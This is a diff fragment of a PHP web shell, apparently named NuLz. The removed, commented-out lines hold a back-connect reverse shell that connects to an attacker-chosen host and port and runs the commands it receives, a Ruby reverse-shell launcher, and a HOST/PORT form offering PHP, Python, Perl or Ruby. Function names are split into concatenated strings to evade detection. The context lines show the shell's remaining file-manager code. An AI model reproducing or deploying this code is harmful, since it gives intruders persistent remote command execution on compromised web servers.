-        //             $out = NuLzCmd("ruby nulz_bc.rb $bc_host $bc_port");
-        //             $slp(1);
-        //             $res = "<pre>$out\n".NuLzCmd("ps aux | grep nulz_bc.rb")."</pre>";
-        //             $glp('nulz_bc.rb');
-        //             return $res;
-        //         } else {
-        //             echo $bc_failed;
-        //         }
-        //     } else {
-        //         $sockfd = $f_get($bc_host, $bc_port, $errno, $errstr);
-        //         if ($errno != 0) {
-        //             return "<pre>$errno : $errstr</pre>";
-        //         } else if (!$sockfd) {
-        //             return "<pre>Unexpected error has occured, connection may have failed.</pre>";
-        //         } else {
-        //             while (!$p_cls($sockfd)) {
-        //                 $user = NuLzCmd('whoami');
-        //                 $pwd = NuLzCmd('pwd');
-        //                 @$f_cls($sockfd, "$user@" . (!@$_SERVER["SERVER_ADDR"] ? ($func_exist($g_host_name) ? @$g_host_name($_SERVER['SERVER_NAME']) : '????') : @$_SERVER["SERVER_ADDR"]) . "~$pwd > ");
-        //                 $cmd = $f_get($sockfd, 1337);
-        //                 @$f_cls($sockfd, "\n" . NuLzCmd($cmd) . "\n\n");
-        //             }
-        //             @$f_cls($sockfd);
-        //         }
-        //     }
-        // }
-        // echo '</div>';
-        // echo '
-        // <form class="max-w-sm mx-5 my-6" action="" method="POST">
-        //     <div class="relative z-0 w-full mb-5 group">
-        //         <input type="text" name="bc_host" id="bc_host" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" placeholder="tcp://0.0.0.0" />
-        //         <label for="bc_host" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">HOST</label>
-        //     </div>
-        //     <div class="relative z-0 w-full mb-5 group">
-        //         <input type="number" name="bc_port" id="bc_port" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" placeholder="1337" />
-        //         <label for="bc_port" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">PORT</label>
-        //     </div>
-        //     <label for="bc" class="block mb-2 text-sm font-medium text-gray-900 dark:text-white">With</label>
-        //     <select id="bc" name="bc_with" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
-        //         <option value="php">PHP</option>
-        //         <option value="python">PYTHON</option>
-        //         <option value="perl">PERL</option>
-        //         <option value="ruby">RUBY</option>
-        //     </select>
-        // ';
-        // echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
-        // echo '<button type="submit" name="btn-bc" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Back Connect</button>';
-        // echo '</form>';
     }
 
     if (isset($_GET['editfile'])) {
@@ -2863,26 +2693,6 @@ $path = str_replace("\\", "/", $path);
                 </thead>
                 <tbody>
                     <?php
-                    //DIR
-                    // $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
-                    // $psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
-                    // $psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
-                    // $psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
-                    // $psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
-                    // $myuid = 'g'.'et'.'my'.'ui'.'d';
-                    // $mygid = 'g'.'et'.'my'.'gi'.'d';
-                    // $cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
-                    // $own_f = 'fi'.'le'.'ow'.'n'.'er';
-                    // $grp_f = 'fi'.'le'.'gr'.'ou'.'p';
-                    // if (!$func_exist($psx_egid)) {
-                    //     $d_user = $func_exist($own_f) ? @$own_f("$path/$dir") : "????";
-                    //     $d_group = $func_exist($grp_f) ? @$grp_f("$path/$dir") : "????";
-                    // } else {
-                    //     $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$own_f("$path/$dir") : array("name" => "????");
-                    //     $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$grp_f("$path/$dir") : array("name" => "????");
-                    //     $d_user = $uid['name'] ? $uid['name'] : ($func_exist($own_f)?@$own_f("$path/$dir"):"????");
-                    //     $d_group = $gid['name'] ? $gid['name'] : ($func_exist($grp_f)?@$grp_f("$path/$dir"):"????");
-                    // }
                     echo "<tr><td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='".$folderIcon."'>&nbsp;<a class='font-bold " . $txtOrange . "' href='?path=".$path."'>.</a></td>";
                     echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center>--</center></td>";
                     echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
